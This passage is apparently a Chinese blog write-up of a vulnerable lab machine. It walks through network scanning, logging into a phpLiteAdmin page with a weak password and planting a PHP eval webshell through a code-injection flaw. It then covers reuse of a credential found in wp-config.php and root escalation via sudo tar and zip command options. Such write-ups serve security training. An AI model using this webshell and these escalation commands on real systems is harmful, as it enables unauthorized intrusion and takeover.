                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070933068.png"
                      alt="image-20240907093349987"
                ></p>
<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>通过&#x3D;&#x3D;arp&#x3D;&#x3D;协议扫描局域网，又快又准，但是只能扫描局域网内的ip。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070935694.png"
                      alt="image-20240907093511650"
                ></p>
<p>发现靶机的IP地址为 &#96;192.168.119.218，然后用nmap对靶机进行详细地扫描。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -p- --min-parallelism 100 192.168.56.140</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>-A 代表综合性扫描，能收集很多重要的信息</p>
<p>-sV 代表扫描主要的服务信息</p>
<p>-p- 参数p是指定端口，后面的<code>-</code>代表所有端口。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070938209.png"
                      alt="image-20240907093843150"
                ></p>
<p>靶机开放了80端口，111端口和53953端口。然后继续扫描目录。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.56.140</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070940799.png"
                      alt="image-20240907094041750"
                ></p>
<h3 id="获取SHELL"><a href="#获取SHELL" class="headerlink" title="获取SHELL"></a>获取SHELL</h3><p>目录扫描发现<code>dbadmin</code>目录，看名字应该是与数据库的管理有关，打开这个目录观察一下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070941180.png"
                      alt="image-20240907094127127"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070942773.png"
                      alt="image-20240907094257728"
                ></p>
<p>发现了一个登陆页面，随便输入一个密码admin，就进了管理页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070952966.png"
                      alt="image-20240907095215906"
                ></p>
<p>1.9.3版本存在远程php代码注入漏洞，下面进行漏洞利用，写入webshell。首先随便创建一个数据库。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070953422.png"
                      alt="image-20240907095351355"
                ></p>
<p>然后在该库里创建一个表。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070955168.png"
                      alt="image-20240907095539116"
                ></p>
<p>随便设置一个字段名称，类型为<code>TEXT</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070956059.png"
                      alt="image-20240907095656006"
                ></p>
<p>在该表中写入一句话木马。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070958248.png"
                      alt="image-20240907095840178"
                ></p>
<p>此时还无法访问到该一句话木马，因为数据库文件的默认存放位置是 <code>/usr/databases/</code>，在该目录中的文件是无法直接访问到的，所以我们需要通过改名来移动文件到可以访问的位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071000738.png"
                      alt="image-20240907100035682"
                ></p>
<p>将原来的<code>/usr/databases/a</code>改为 <code>a.php</code>。此处不要使用<code>绝对路径</code>，需要使用<code>相对路径</code>。此处使用<code>相对路径</code>，数据库文件就会移动到当前管理页面的同级目录中，也就是 <code>/dbadmin/</code>中。</p>
<p>访问 <code>http://192.168.56.140/dbadmin/</code>，发现a.php已经存在这个目录中了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071001009.png"
                      alt="image-20240907100110955"
                ></p>
<p>然后通过蚁剑就可以连接到该一句话木马。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071003917.png"
                      alt="image-20240907100300401"
                ></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>获取shell尝试一下suid提权，没有成功。然后去查找靶机中有没有存在敏感信息。最终在家目录中wordpress中的配置文件<code>wp-config.php</code>中找到了<code>zico</code>账号和密码 <code>sWfCsfJSPV9H3AmQzw8</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071005222.png"
                      alt="image-20240907100529161"
                ></p>
<p>尝试用ssh登陆，成功连接上了。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ssh zico@192.168.56.140</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071014815.png"
                      alt="image-20240907101457771"
                ></p>
<p>尝试各种提权方法，最终发现可以通过sudo提权。可以通过具有root权限的tar和zip来提权。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></div>

<p>通过tar提权：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; shell.sh</span><br><span class="line">sudo tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh shell.sh</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>–checkpoint&#x3D;n 每写入n个记录之后设置一个检查点（默认值为10）。</p>
<p>–checkpoint-action&#x3D;cmd 在每个checkpoint（检查点）上执行cmd。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071018000.png"
                      alt="image-20240907101839946"
                ></p>
<p>通过zip提权：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">touch a</span><br><span class="line">sudo zip a.zip a -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br><span class="line">12</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>-T –unzip-command&#x3D;cmd 代表在压缩文件后对压缩文件进行检测，检测文件时不是用系统标准的 <code>unzip -tqq</code>来检测，而是使用通过–unzip-command指定的<code>cmd</code>命令来检查文件。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071014472.png"
                      alt="image-20240907101439426"
                ></p>
<p>读取flag！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071016911.png"
                      alt="image-20240907101646855"
                ></p>
]]></content>
  </entry>
</search>
